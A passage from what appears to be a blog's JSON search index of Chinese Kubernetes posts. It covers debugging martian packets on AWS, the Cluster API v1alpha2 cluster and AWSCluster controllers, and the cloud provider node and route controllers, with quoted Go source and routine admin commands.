8961,sackOK,TS val 492354 ecr 149208184,nop,wscale 7], length 007:04:57.892015 IP 10.0.10.207.10250 &gt; 10.0.10.69.34932: Flags [S.], seq 449930065, ack 724857165, win 26847, options [mss 8961,sackOK,TS val 492450 ecr 149208535,nop,wscale 7], length 007:04:58.139725 IP 10.0.10.207.10250 &gt; 10.0.10.69.34924: Flags [S.], seq 899903279, ack 2422028185, win 26847, options [mss 8961,sackOK,TS val 492512 ecr 149208343,nop,wscale 7], length 007:04:58.151092 IP 10.0.10.207.10250 &gt; 10.0.10.69.34924: Flags [S.], seq 899903279, ack 2422028185, win 26847, options [mss 8961,sackOK,TS val 492514 ecr 149208343,nop,wscale 7], length 007:04:58.267760 IP 10.0.10.207.10250 &gt; 10.0.10.69.34822: Flags [S.], seq 3998514543, ack 1418773910, win 26847, options [mss 8961,sackOK,TS val 492544 ecr 149204785,nop,wscale 7], length 007:04:58.907735 IP 10.0.10.207.10250 &gt; 10.0.10.69.34932: Flags [S.], seq 449930065, ack 724857165, win 26847, options [mss 8961,sackOK,TS val 492704 ecr 149208535,nop,wscale 7], length 0 123root@ip-10-0-10-207:/home/admin# ip rout get 10.0.10.69/2410.0.10.69 dev eth1 src 10.0.10.190 cache 发现出现接受流量的是 eth0, 但是发送的响应的 eth1. 咨询网络同事，发现这个现象已经有专有词汇了叫火星包, 配置内核参数 1234root@ip-10-0-10-207:/home/admin# sysctl -w net.ipv4.conf.all.log_martians=1net.ipv4.conf.all.log_martians = 1root@ip-10-0-10-207:/home/admin# sysctl -w net.ipv4.conf.default.log_martians=1net.ipv4.conf.default.log_martians = 1 可以看到 kernel 已经打出来日志了。 12345678[ 5210.822567] ll header: 00000000: 02 00 ba 2b 02 3f 02 62 68 47 23 a1 08 00 ...+.?.bhG#...[ 5211.652509] IPv4: martian source 10.0.10.207 from 10.0.10.137, on dev eth0[ 5211.652547] ll header: 00000000: 02 00 ba 2b 02 3f 02 bd a6 b6 aa 3f 08 00 ...+.?.....?..[ 5211.830836] IPv4: martian source 10.0.10.115 from 10.0.0.224, on dev eth0[ 5211.830875] ll header: 00000000: 02 00 ba 2b 02 3f 02 bd a6 b6 aa 3f 08 00 ...+.?.....?..[ 5211.869305] IPv4: martian source 10.0.10.115 from 10.0.0.209, on dev eth0[ 5211.869338] ll header: 00000000: 02 00 ba 2b 02 3f 02 bd a6 b6 aa 3f 08 00 ...+.?.....?..[ 5232.836561] IPv4: host 10.0.10.115/if3 ignores redirects for 10.0.0.224 to 10.0.10.1 目前的修复方案，将来响应请求和接受请求通过修改路由表的方式都换成 eth0. 123456root@ip-10-0-10-207:/home/admin# ip routedefault via 10.0.10.1 dev eth110.0.10.0/24 dev eth1 proto kernel scope link src 10.0.10.19010.0.10.0/24 dev eth0 proto kernel scope link src 10.0.10.207172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdownadmin@ip-10-0-10-207:~$ sudo ip route del 10.0.10.0/24 dev eth1 proto kernel scope link src 10.0.10.190 只要将 eth1 的明细路由删除，影响路由决策让来的数据包走原来的网络接口回去。 当然还有其他方案，比如说在 AWS 的 console 上关闭 ec2 instance 的来源地址检查也可以。","tags":["k8s"]},{"title":"cluster api v1alpha2 之 cluster","path":"/2019/10/20/cluster-api-v1alpha2-cluster/","content":"因为最近工作需要，调研了 cluster api provider aws.整理调研过程中的知识如下： manager cluster 是一个注册了多个 crd 并运行三个 controller 的普通 k8s 集群。 三个 controller 分别是：cabpk-controller-manager 核心功能是用来生产集群证书统一签发，核心进程的参数下发。capa-controller-manager 核心功能是和 aws 沟通，负责 CRUD 云上资源。capi-controller-manager 核心功能是确定 cluster api group 和集群公用资源。 用户通过 CAPA 脚本渲染 spec目前 cluster api 使用过 shell 脚本渲染出基本的集群模版文件，并由用户主动发送的到 manager cluster 中。渲染出的 cluster 资源如下，看到 api version 是 v1alpha2 , 下面支持 amazon cni 是自己适配开发的。cluster crd 由 capi-controller-manager 中的 cluster 负责调协工作。 12345678910111213141516171819apiVersion: cluster.x-k8s.io/v1alpha2kind: Clustermetadata: annotations: cluster.k8s.io/network-cni: AmazonVPC name: testnetwork3spec: clusterNetwork: pods: cidrBlocks: - 10.66.0.0/24 services: cidrBlocks: - 192.168.0.0/16 infrastructureRef: apiVersion: infrastructure.cluster.x-k8s.io/v1alpha2 kind: AWSCluster name: testnetwork3 namespace: default 渲染出的 awscluster 资源如下，声明式的告诉进行 capa-controller-manager 中的 awscluster controller 进行调协 时要按照 yaml 里面描述创建子网信息。 之所以要创建 6 个子网是计划通过 aws 来投放 HA 的 kubernetes 集群，每个区域放一个 master apiserver. 123456789101112131415161718192021222324252627282930apiVersion: infrastructure.cluster.x-k8s.io/v1alpha2kind: AWSClustermetadata: name: testnetwork3 namespace: defaultspec: networkSpec: subnets: - availabilityZone: us-east-2a cidrBlock: 10.66.0.0/27 isPublic: true - availabilityZone: us-east-2a cidrBlock: 10.66.0.32/27 isPublic: false - availabilityZone: us-east-2b cidrBlock: 10.66.0.64/27 isPublic: true - availabilityZone: us-east-2b cidrBlock: 10.66.0.96/27 isPublic: false - availabilityZone: us-east-2c cidrBlock: 10.66.0.128/27 isPublic: true - availabilityZone: us-east-2c cidrBlock: 10.66.0.160/27 isPublic: false vpc: cidrBlock: 10.66.0.0/24 region: us-east-2 sshKeyName: guohao 上面两个文件和在一起就是 CAPA 官方的渲染脚本输出的 cluster.yaml 文件的全部内容了，虽然是一个文件 2 个 yaml, 但是确涉及到了 2 个 controller manager 中的 awscluster controller 和 cluster controller. cluster controller 如何工作的在 capa 中 cluster controller 不能独立与 awscluster controller 工作，两个组建之间的协作流程如下图。 cluster-controller-and-awscluster-controller Figure 1 presents the sequence of actions involved in provisioning a cluster, highlighting the coordination required between the CAPI cluster controller and the provider infrastructure controller. The creation of the Cluster and provider infrastructure objects are independent events. It is expected that the cluster infrastructure object to be created before the cluster object and the reference be set to in the cluster object at creation time. When a provider infrastructure object is created, the provider’s controller will do nothing unless its owner reference is set to a cluster object. When the cluster object is created, the cluster controller will retrieve the infrastructure object. If the object has not been seen before, it will start watching it. Also, if the object’s owner is not set, it will set to the Cluster object. When an infrastructure object is updated, the provider controller will check the owner reference. If it is set, it will retrieve the cluster object to obtain the required cluster specification and starts the provisioning process. When the process finishes, it sets the Infrastructure.Status.Ready to true. When the cluster controller detects the Infrastructure.Status.Ready is set to true, it updates Cluster.Status.APIEndpoints from Infrastructure.Status.APIEndpoints and sets Cluster.Status.InfrastructureReady to true. 上述流程还是比较明了的。 cluster controller 实现目前 controller 的开发都是使用了 kubebuilder 那一套脚手架了，controller 开发模式直接大同小异了。核心就是一个函数 reconcile . 核心函数的核心逻辑代码如下，三个子资源的 reconcile, cluster controller 整个流程并没有实际创建什么东西，仅仅是对账信息，组装流程。 1234567891011// reconcile handles cluster reconciliation.func (r *ClusterReconciler) reconcile(ctx context.Context, cluster *clusterv1.Cluster) (ctrl.Result, error) &#123;...\t// Call the inner reconciliation methods.\treconciliationErrors := []error&#123; r.reconcileInfrastructure(ctx, cluster), r.reconcileKubeconfig(ctx, cluster), r.reconcileControlPlaneInitialized(ctx, cluster),\t&#125;...&#125; reconcileInfrastructure 的实现就像之前提议里面描述一样，因为并不涉及到实际的资源创建。只是从 awscluster 的 yaml 中获取 infrastructure 和 apiserver endpoint 信息。 1234567891011121314151617181920212223242526272829303132333435363738394041424344// reconcileInfrastructure reconciles the Spec.InfrastructureRef object on a Cluster.func (r *ClusterReconciler) reconcileInfrastructure(ctx context.Context, cluster *clusterv1.Cluster) error &#123;\tlogger := r.Log.WithValues(&quot;cluster&quot;, cluster.Name, &quot;namespace&quot;, cluster.Namespace)\tif cluster.Spec.InfrastructureRef == nil &#123; return nil\t&#125;\t// Call generic external reconciler.\tinfraConfig, err := r.reconcileExternal(ctx, cluster, cluster.Spec.InfrastructureRef)\tif err != nil &#123; return err\t&#125;\t// There&#x27;s no need to go any further if the Cluster is marked for deletion.\tif !infraConfig.GetDeletionTimestamp().IsZero() &#123; return nil\t&#125;\t// Determine if the infrastructure provider is ready.\tif !cluster.Status.InfrastructureReady &#123; ready, err := external.IsReady(infraConfig) if err != nil &#123; return err &#125; else if !ready &#123; logger.V(3).Info(&quot;Infrastructure provider is not ready yet&quot;) return nil &#125; cluster.Status.InfrastructureReady = true\t&#125;\t// Get and parse Status.APIEndpoint field from the infrastructure provider.\tif len(cluster.Status.APIEndpoints) == 0 &#123; if err := util.UnstructuredUnmarshalField(infraConfig, &amp;cluster.Status.APIEndpoints, &quot;status&quot;, &quot;apiEndpoints&quot;); err != nil &#123; return errors.Wrapf(err, &quot;failed to retrieve Status.APIEndpoints from infrastructure provider for Cluster %q in namespace %q&quot;, cluster.Name, cluster.Namespace) &#125; else if len(cluster.Status.APIEndpoints) == 0 &#123; return errors.Wrapf(err, &quot;retrieved empty Status.APIEndpoints from infrastructure provider for Cluster %q in namespace %q&quot;, cluster.Name, cluster.Namespace) &#125;\t&#125;\treturn nil&#125; kubeconfig 的信息对账，如果没有有现成的 kubeconfig 那就创建一个现成的，附上一个从 manager cluster 中获取 kubeconfig 的指令。 1kubectl --namespace=default get secret $CLUSTER_NAME-kubeconfig -o json | jq -r .data.value | base64 --decode &gt; $CLUSTER_NAME-kubeconfig 1234567891011121314func (r *ClusterReconciler) reconcileKubeconfig(ctx context.Context, cluster *clusterv1.Cluster) error &#123;\tif len(cluster.Status.APIEndpoints) == 0 &#123; return nil\t&#125;\t_, err := secret.Get(r.Client, cluster, secret.Kubeconfig)\tswitch &#123;\tcase apierrors.IsNotFound(err): if err := kubeconfig.CreateSecret(ctx, r.Client, cluster); err != nil &#123;...\treturn nil&#125; 如果有一个 master 节点是初始化完成，这个函数就不会发生任何错误。 12345678910111213141516171819202122func (r *ClusterReconciler) reconcileControlPlaneInitialized(ctx context.Context, cluster *clusterv1.Cluster) error &#123;\tlogger := r.Log.WithValues(&quot;cluster&quot;, cluster.Name, &quot;namespace&quot;, cluster.Namespace)\tif cluster.Status.ControlPlaneInitialized &#123; return nil\t&#125;\tmachines, err := getActiveMachinesInCluster(ctx, r.Client, cluster.Namespace, cluster.Name)\tif err != nil &#123; logger.Error(err, &quot;Error getting machines in cluster&quot;) return err\t&#125;\tfor _, m := range machines &#123; if util.IsControlPlaneMachine(m) &amp;&amp; m.Status.NodeRef != nil &#123; cluster.Status.ControlPlaneInitialized = true return nil &#125;\t&#125;\treturn nil&#125; awscluster controller 如何工作的下面就是 aws cluster controller 的核心逻辑 123456789101112131415161718192021222324252627282930313233343536373839404142434445// TODO(ncdc): should this be a function on ClusterScope?func reconcileNormal(clusterScope *scope.ClusterScope) (reconcile.Result, error) &#123;\tclusterScope.Info(&quot;Reconciling AWSCluster&quot;)\tawsCluster := clusterScope.AWSCluster\t// If the AWSCluster doesn&#x27;t have our finalizer, add it.\tif !util.Contains(awsCluster.Finalizers, infrav1.ClusterFinalizer) &#123; awsCluster.Finalizers = append(awsCluster.Finalizers, infrav1.ClusterFinalizer)\t&#125;\tec2Service := ec2.NewService(clusterScope)\telbService := elb.NewService(clusterScope)\tif err := ec2Service.ReconcileNetwork(); err != nil &#123; // 基础网络组网 return reconcile.Result&#123;&#125;, errors.Wrapf(err, &quot;failed to reconcile network for AWSCluster %s/%s&quot;, awsCluster.Namespace, awsCluster.Name)\t&#125;\tif err := ec2Service.ReconcileBastion(); err != nil &#123; // vpc 跳板机的创建 return reconcile.Result&#123;&#125;, errors.Wrapf(err, &quot;failed to reconcile bastion host for AWSCluster %s/%s&quot;, awsCluster.Namespace, awsCluster.Name)\t&#125;\tif err := elbService.ReconcileLoadbalancers(); err != nil &#123; // apiserver 的 lb 创建 return reconcile.Result&#123;&#125;, errors.Wrapf(err, &quot;failed to reconcile load balancers for AWSCluster %s/%s&quot;, awsCluster.Namespace, awsCluster.Name)\t&#125;\tif awsCluster.Status.Network.APIServerELB.DNSName == &quot;&quot; &#123; clusterScope.Info(&quot;Waiting on API server ELB DNS name&quot;) return reconcile.Result&#123;RequeueAfter: 15 * time.Second&#125;, nil\t&#125;\t// Set APIEndpoints so the Cluster API Cluster Controller can pull them\t// TODO: should we get the Port from the first listener on the ELB?\tawsCluster.Status.APIEndpoints = []infrav1.APIEndpoint&#123; &#123; Host: awsCluster.Status.Network.APIServerELB.DNSName, Port: int(clusterScope.APIServerPort()), &#125;,\t&#125;\t// No errors, so mark us ready so the Cluster API Cluster Controller can pull it\tawsCluster.Status.Ready = true\treturn reconcile.Result&#123;&#125;, nil&#125; ReconcileNetwork 就是基础组网的逻辑，这个逻辑会按照你传入的 network 信息进行最基本的 vpc 创建，定制化的 subnet 创建。 123456789101112131415161718192021222324252627282930313233343536func (s *Service) ReconcileNetwork() (err error) &#123;\ts.scope.V(2).Info(&quot;Reconciling network for cluster&quot;, &quot;cluster-name&quot;, s.scope.Cluster.Name, &quot;cluster-namespace&quot;, s.scope.Cluster.Namespace)\t// VPC.\tif err := s.reconcileVPC(); err != nil &#123; return err\t&#125;\t// Subnets.\tif err := s.reconcileSubnets(); err != nil &#123; return err\t&#125;\t// Internet Gateways.\tif err := s.reconcileInternetGateways(); err != nil &#123; return err\t&#125;\t// NAT Gateways.\tif err := s.reconcileNatGateways(); err != nil &#123; // 这里有点问题，按照我之前 spec 描述就会创建出三个 NATGW, 有点浪费了。 return err\t&#125;\t// Routing tables.\tif err := s.reconcileRouteTables(); err != nil &#123; return err\t&#125;\t// Security groups.\tif err := s.reconcileSecurityGroups(); err != nil &#123; return err\t&#125;\ts.scope.V(2).Info(&quot;Reconcile network completed successfully&quot;)\treturn nil&#125; 其余两个流程过于简单就不单独概述了，自行浏览代码即可。","tags":["k8s"]},{"title":"cloud provider node controller","path":"/2019/04/02/cloud-provider-node-controller/","content":"node controller 是负责初始化&#x2F;维护一个k8s node 在云上标识的信息，主要信息如下： 1: 初始化node的云相关的zone&#x2F;region信息labels。2: 初始化 node 的云上的实例信息，比如说 type 和 szie。3: 获取 node 的网络地址信息和主机名称。4: 当客户通过云的虚拟机管理面板删除主机的时候需要从 k8s 中同步的删除 node。 在实现上 cloud node controllr 核心逻辑只是重度依赖 cloud 接口 和 node Informers。 12345678910111213// startControllers starts the cloud specific controller loops.func startControllers(c *cloudcontrollerconfig.CompletedConfig, stop &lt;-chan struct&#123;&#125;, cloud cloudprovider.Interface) error &#123;... // Start the CloudNodeController nodeController := cloudcontrollers.NewCloudNodeController( c.SharedInformers.Core().V1().Nodes(), client(&quot;cloud-node-controller&quot;), cloud, c.ComponentConfig.KubeCloudShared.NodeMonitorPeriod.Duration, c.ComponentConfig.NodeStatusUpdateFrequency.Duration) nodeController.Run(stop)...&#125; node controller 实现最开始描述 4 个需求只有两块核心逻辑： 其一是周期性不断执行的UpdateNodeStatus和MonitorNode，前者是更新节点状态比如 ip 地址，后者通过云平台管理接口监控虚拟机，当客户通过虚拟机管理页面移除机器时候保证 k8s 中 node 也会被删除。 其二是通过 controller 机制来触发的两个回调函数AddCloudNode和UpdateCloudNode添加虚拟机与云相关标签比如实例类型x2.larget实例 Idins-xxx还有 ip 地址等。 1234567891011121314151617// NewCloudNodeController creates a CloudNodeController objectfunc NewCloudNodeController( nodeInformer coreinformers.NodeInformer, kubeClient clientset.Interface, cloud cloudprovider.Interface, nodeMonitorPeriod time.Duration, nodeStatusUpdateFrequency time.Duration) *CloudNodeController &#123;... // Use shared informer to listen to add/update of nodes. Note that any nodes // that exist before node controller starts will show up in the update method cnc.nodeInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs&#123; AddFunc: cnc.AddCloudNode, UpdateFunc: cnc.UpdateCloudNode, &#125;) return cnc&#125; cloud node controller 第一块逻辑：在实现上 cloud node controller 仅仅注册了 2 个回调函数，而且在实现上 UpdateCloudNode 调用了 AddCloudNode。 1234567func (cnc *CloudNodeController) UpdateCloudNode(_, newObj interface&#123;&#125;) &#123;\tif _, ok := newObj.(*v1.Node); !ok &#123; utilruntime.HandleError(fmt.Errorf(&quot;unexpected object type: %v&quot;, newObj)) return\t&#125;\tcnc.AddCloudNode(newObj)&#125; 可以看一下 AddCloudNode 实现： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980// This processes nodes that were added into the cluster, and cloud initialize them if appropriatefunc (cnc *CloudNodeController) AddCloudNode(obj interface&#123;&#125;) &#123;\tnode := obj.(*v1.Node)// 这里一个判断是否要进入 cloud node controller 的初始化流程\tcloudTaint := getCloudTaint(node.Spec.Taints)\tif cloudTaint == nil &#123; glog.V(2).Infof(&quot;This node %s is registered without the cloud taint. Will not process.&quot;, node.Name) return\t&#125;...\terr := clientretry.RetryOnConflict(UpdateNodeSpecBackoff, func() error &#123;// 移除了 gce 特有逻辑... curNode, err := cnc.kubeClient.CoreV1().Nodes().Get(node.Name, metav1.GetOptions&#123;&#125;) if err != nil &#123; return err &#125;// 尝试填补 node spec provider:// 字段 if curNode.Spec.ProviderID == &quot;&quot; &#123; providerID, err := cloudprovider.GetInstanceProviderID(context.TODO(), cnc.cloud, types.NodeName(curNode.Name)) if err == nil &#123; curNode.Spec.ProviderID = providerID &#125; ... &#125; nodeAddresses, err := getNodeAddressesByProviderIDOrName(instances, curNode) if err != nil &#123; return err &#125; // If user provided an IP address, ensure that IP address is found // in the cloud provider before removing the taint on the node if nodeIP, ok := ensureNodeProvidedIPExists(curNode, nodeAddresses); ok &#123; if nodeIP == nil &#123; return errors.New(&quot;failed to find kubelet node IP from cloud provider&quot;) &#125; &#125; if instanceType, err := getInstanceTypeByProviderIDOrName(instances, curNode); err != nil &#123; return err &#125; else if instanceType != &quot;&quot; &#123; glog.V(2).Infof(&quot;Adding node label from cloud provider: %s=%s&quot;, kubeletapis.LabelInstanceType, instanceType) // 在 instance spec 添加 instance type curNode.ObjectMeta.Labels[kubeletapis.LabelInstanceType] = instanceType &#125; if zones, ok := cnc.cloud.Zones(); ok &#123; zone, err := getZoneByProviderIDOrName(zones, curNode) if err != nil &#123; return fmt.Errorf(&quot;failed to get zone from cloud provider: %v&quot;, err) &#125; if zone.FailureDomain != &quot;&quot; &#123; glog.V(2).Infof(&quot;Adding node label from cloud provider: %s=%s&quot;, kubeletapis.LabelZoneFailureDomain, zone.FailureDomain) // 在 instance spec 中准备 zone 信息 curNode.ObjectMeta.Labels[kubeletapis.LabelZoneFailureDomain] = zone.FailureDomain &#125; if zone.Region != &quot;&quot; &#123; glog.V(2).Infof(&quot;Adding node label from cloud provider: %s=%s&quot;, kubeletapis.LabelZoneRegion, zone.Region) curNode.ObjectMeta.Labels[kubeletapis.LabelZoneRegion] = zone.Region &#125; &#125; curNode.Spec.Taints = excludeTaintFromList(curNode.Spec.Taints, *cloudTaint) // 去更新 node spec _, err = cnc.kubeClient.CoreV1().Nodes().Update(curNode) if err != nil &#123; return err &#125; // After adding, call UpdateNodeAddress to set the CloudProvider provided IPAddresses // So that users do not see any significant delay in IP addresses being filled into the node cnc.updateNodeAddress(curNode, instances) return nil\t&#125;)...\tglog.Infof(&quot;Successfully initialized node %s with cloud provider&quot;, node.Name)&#125; cloud node controller 第二块逻辑：周期性调用UpdateNodeStatus和MonitorNode。 123456789101112131415// This controller deletes a node if kubelet is not reporting// and the node is gone from the cloud provider.func (cnc *CloudNodeController) Run(stopCh &lt;-chan struct&#123;&#125;) &#123; defer utilruntime.HandleCrash() // The following loops run communicate with the APIServer with a worst case complexity // of O(num_nodes) per cycle. These functions are justified here because these events fire // very infrequently. DO NOT MODIFY this to perform frequent operations. // Start a loop to periodically update the node addresses obtained from the cloud go wait.Until(cnc.UpdateNodeStatus, cnc.nodeStatusUpdateFrequency, stopCh) // Start a loop to periodically check if any nodes have been deleted from cloudprovider go wait.Until(cnc.MonitorNode, cnc.nodeMonitorPeriod, stopCh)&#125; UpdateNodeStatus的实现更新了ip address。 123456789101112131415// UpdateNodeStatus updates the node status, such as node addressesfunc (cnc *CloudNodeController) UpdateNodeStatus() &#123; instances, ok := cnc.cloud.Instances()... nodes, err := cnc.kubeClient.CoreV1().Nodes().List(metav1.ListOptions&#123;ResourceVersion: &quot;0&quot;&#125;) if err != nil &#123; glog.Errorf(&quot;Error monitoring node status: %v&quot;, err) return &#125; for i := range nodes.Items &#123; cnc.updateNodeAddress(&amp;nodes.Items[i], instances) &#125;&#125; MonitorNode 函数也是周期性执行，当调用 cloud provider 发现节点不存在的时候也会从 k8s 中移除节点。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697// Monitor node queries the cloudprovider for non-ready nodes and deletes them// if they cannot be found in the cloud providerfunc (cnc *CloudNodeController) MonitorNode() &#123;...\tnodes, err := cnc.kubeClient.CoreV1().Nodes().List(metav1.ListOptions&#123;ResourceVersion: &quot;0&quot;&#125;)\tif err != nil &#123; glog.Errorf(&quot;Error monitoring node status: %v&quot;, err) return\t&#125;\tfor i := range nodes.Items &#123; var currentReadyCondition *v1.NodeCondition node := &amp;nodes.Items[i] // Try to get the current node status // If node status is empty, then kubelet has not posted ready status yet. In this case, process next node for rep := 0; rep &lt; nodeStatusUpdateRetry; rep++ &#123; _, currentReadyCondition = nodeutilv1.GetNodeCondition(&amp;node.Status, v1.NodeReady) if currentReadyCondition != nil &#123; break &#125; name := node.Name node, err = cnc.kubeClient.CoreV1().Nodes().Get(name, metav1.GetOptions&#123;&#125;) if err != nil &#123; glog.Errorf(&quot;Failed while getting a Node to retry updating NodeStatus. Probably Node %s was deleted.&quot;, name) break &#125; time.Sleep(retrySleepTime) &#125; if currentReadyCondition == nil &#123; glog.Errorf(&quot;Update status of Node %v from CloudNodeController exceeds retry count or the Node was deleted.&quot;, node.Name) continue &#125; // If the known node status says that Node is NotReady, then check if the node has been removed // from the cloud provider. If node cannot be found in cloudprovider, then delete the node immediately if currentReadyCondition != nil &#123; if currentReadyCondition.Status != v1.ConditionTrue &#123; // we need to check this first to get taint working in similar in all cloudproviders // current problem is that shutdown nodes are not working in similar way ie. all cloudproviders // does not delete node from kubernetes cluster when instance it is shutdown see issue #46442 shutdown, err := nodectrlutil.ShutdownInCloudProvider(context.TODO(), cnc.cloud, node) if err != nil &#123; glog.Errorf(&quot;Error checking if node %s is shutdown: %v&quot;, node.Name, err) &#125; if shutdown &amp;&amp; err == nil &#123; // if node is shutdown add shutdown taint err = controller.AddOrUpdateTaintOnNode(cnc.kubeClient, node.Name, controller.ShutdownTaint) if err != nil &#123; glog.Errorf(&quot;Error patching node taints: %v&quot;, err) &#125; // Continue checking the remaining nodes since the current one is shutdown. continue &#125; // Check with the cloud provider to see if the node still exists. If it // doesn&#x27;t, delete the node immediately. exists, err := ensureNodeExistsByProviderID(instances, node) if err != nil &#123; glog.Errorf(&quot;Error checking if node %s exists: %v&quot;, node.Name, err) continue &#125; if exists &#123; // Continue checking the remaining nodes since the current one is fine. continue &#125; glog.V(2).Infof(&quot;Deleting node since it is no longer present in cloud provider: %s&quot;, node.Name) ref := &amp;v1.ObjectReference&#123; Kind: &quot;Node&quot;, Name: node.Name, UID: types.UID(node.UID), Namespace: &quot;&quot;, &#125; glog.V(2).Infof(&quot;Recording %s event message for node %s&quot;, &quot;DeletingNode&quot;, node.Name) cnc.recorder.Eventf(ref, v1.EventTypeNormal, fmt.Sprintf(&quot;Deleting Node %v because it&#x27;s not present according to cloud provider&quot;, node.Name), &quot;Node %s event: %s&quot;, node.Name, &quot;DeletingNode&quot;) go func(nodeName string) &#123; defer utilruntime.HandleCrash() if err := cnc.kubeClient.CoreV1().Nodes().Delete(nodeName, nil); err != nil &#123; glog.Errorf(&quot;unable to delete node %q: %v&quot;, nodeName, err) &#125; &#125;(node.Name) &#125; else &#123; // if taint exist remove taint err = controller.RemoveTaintOffNode(cnc.kubeClient, node.Name, node, controller.ShutdownTaint) if err != nil &#123; glog.Errorf(&quot;Error patching node taints: %v&quot;, err) &#125; &#125; &#125;\t&#125;&#125;","tags":["k8s"]},{"title":"cloud provider route controller","path":"/2019/04/02/cloud-provider-route-controller/","content":"​\t当 pod 的 CIDR 和所属的 node 不属于同一个 cidr 上时候，在部分云上就会有 pod 和 node 网络互通的问题，而 route controller 就是被设计用来创建路由解决这个问题的方案。 ​\t如果计划让 k8s 启动的 pod 从指定的 cidr 中分配 ip 常见的方式是通过指定 KCM 的启动参数cluster-cidr来指定 POD CIDR，service 也可以通过 KCM 的service-cluster-ip-range参数指定 CIDR。 ​\tcloud provider 启动时候通过判断 AllocateNodeCIDRs 与 ConfigureCloudRoutes 的与逻辑来判断 k8s 的 pod 是否从指定的 cidr 中分配 IP，AllocateNodeCIDRs 字段的意义是 AllocateNodeCIDRs enables CIDRs for Pods to be allocated and, if ConfigureCloudRoutes is true, to be set on the cloud provider.,ConfigureCloudRoutes 字段的意义是configureCloudRoutes enables CIDRs allocated with allocateNodeCIDRs to be configured on the cloud provider. 123456789101112131415161718192021// startControllers starts the cloud specific controller loops.func startControllers(c *cloudcontrollerconfig.CompletedConfig, stop &lt;-chan struct&#123;&#125;, cloud cloudprovider.Interface) error &#123;...\t// If CIDRs should be allocated for pods and set on the CloudProvider, then start the route controller\tif c.ComponentConfig.KubeCloudShared.AllocateNodeCIDRs &amp;&amp; c.ComponentConfig.KubeCloudShared.ConfigureCloudRoutes &#123; // 这里判断是否实现了 cloud provider route 相关接口 if routes, ok := cloud.Routes(); !ok &#123; glog.Warning(&quot;configure-cloud-routes is set, but cloud provider does not support routes. Will not configure cloud provider routes.&quot;) &#125; else &#123; var clusterCIDR *net.IPNet if len(strings.TrimSpace(c.ComponentConfig.KubeCloudShared.ClusterCIDR)) != 0 &#123; _, clusterCIDR, err = net.ParseCIDR(c.ComponentConfig.KubeCloudShared.ClusterCIDR) if err != nil &#123; glog.Warningf(&quot;Unsuccessful parsing of cluster CIDR %v: %v&quot;, c.ComponentConfig.KubeCloudShared.ClusterCIDR, err) &#125; &#125; routeController := routecontroller.New(routes, client(&quot;route-controller&quot;), c.SharedInformers.Core().V1().Nodes(), c.ComponentConfig.KubeCloudShared.ClusterName, clusterCIDR) go routeController.Run(stop, c.ComponentConfig.KubeCloudShared.RouteReconciliationPeriod.Duration) ...&#125; ​\t这个 Run 函数保持着 cloud provider 运行 controller 的一贯风格，并没有什么特别要注意的地方。 123456789101112131415func (rc *RouteController) Run(stopCh &lt;-chan struct&#123;&#125;, syncPeriod time.Duration) &#123;... // TODO: If we do just the full Resync every 5 minutes (default value) // that means that we may wait up to 5 minutes before even starting // creating a route for it. This is bad. // We should have a watch on node and if we observe a new node (with CIDR?) // trigger reconciliation for that node. go wait.NonSlidingUntil(func() &#123; if err := rc.reconcileNodeRoutes(); err != nil &#123; glog.Errorf(&quot;Couldn&#x27;t reconcile node routes: %v&quot;, err) &#125; &#125;, syncPeriod, stopCh)...&#125; ​\t这里地方的实现唯一值得说道的是reconcile的函数命名，在 k8s 的 controller 中讲现实世界变成声明式中的过程称为reconcile。 12345func (rc *RouteController) reconcileNodeRoutes() error &#123; routeList, err := rc.routes.ListRoutes(context.TODO(), rc.clusterName)... return rc.reconcile(nodes, routeList)&#125; ​\t这个是实际 reconcile 的过程，就是找到现实世界和期望世界差距，然后通过 cloud proivder route所提供的接口操作云上的route资源进行添加&#x2F;删除操作将其变成期望的模样。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576func (rc *RouteController) reconcile(nodes []*v1.Node, routes []*cloudprovider.Route) error &#123; // nodeCIDRs maps nodeName-&gt;nodeCIDR nodeCIDRs := make(map[types.NodeName]string) // routeMap maps routeTargetNode-&gt;route routeMap := make(map[types.NodeName]*cloudprovider.Route) for _, route := range routes &#123; if route.TargetNode != &quot;&quot; &#123; routeMap[route.TargetNode] = route &#125; &#125; wg := sync.WaitGroup&#123;&#125; rateLimiter := make(chan struct&#123;&#125;, maxConcurrentRouteCreations) for _, node := range nodes &#123; // Skip if the node hasn&#x27;t been assigned a CIDR yet. if node.Spec.PodCIDR == &quot;&quot; &#123; continue &#125; nodeName := types.NodeName(node.Name) // Check if we have a route for this node w/ the correct CIDR. r := routeMap[nodeName] if r == nil || r.DestinationCIDR != node.Spec.PodCIDR &#123; // If not, create the route. route := &amp;cloudprovider.Route&#123; TargetNode: nodeName, DestinationCIDR: node.Spec.PodCIDR, &#125; nameHint := string(node.UID) wg.Add(1) go func(nodeName types.NodeName, nameHint string, route *cloudprovider.Route) &#123; defer wg.Done() err := clientretry.RetryOnConflict(updateNetworkConditionBackoff, func() error &#123; startTime := time.Now() // Ensure that we don&#x27;t have more than maxConcurrentRouteCreations // CreateRoute calls in flight. rateLimiter &lt;- struct&#123;&#125;&#123;&#125; glog.Infof(&quot;Creating route for node %s %s with hint %s, throttled %v&quot;, nodeName, route.DestinationCIDR, nameHint, time.Since(startTime)) err := rc.routes.CreateRoute(context.TODO(), rc.clusterName, nameHint, route) &lt;-rateLimiter rc.updateNetworkingCondition(nodeName, err == nil) if err != nil &#123; msg := fmt.Sprintf(&quot;Could not create route %s %s for node %s after %v: %v&quot;, nameHint, route.DestinationCIDR, nodeName, time.Since(startTime), err) if rc.recorder != nil &#123; rc.recorder.Eventf( &amp;v1.ObjectReference&#123; Kind: &quot;Node&quot;, Name: string(nodeName), UID: types.UID(nodeName), Namespace: &quot;&quot;, &#125;, v1.EventTypeWarning, &quot;FailedToCreateRoute&quot;, msg) &#125; glog.V(4).Infof(msg) return err &#125; glog.Infof(&quot;Created route for node %s %s with hint %s after %v&quot;, nodeName, route.DestinationCIDR, nameHint, time.Now().Sub(startTime)) return nil &#125;) if err != nil &#123; glog.Errorf(&quot;Could not create route %s %s for node %s: %v&quot;, nameHint, route.DestinationCIDR, nodeName, err) &#125; &#125;(nodeName, nameHint, route) &#125; else &#123; 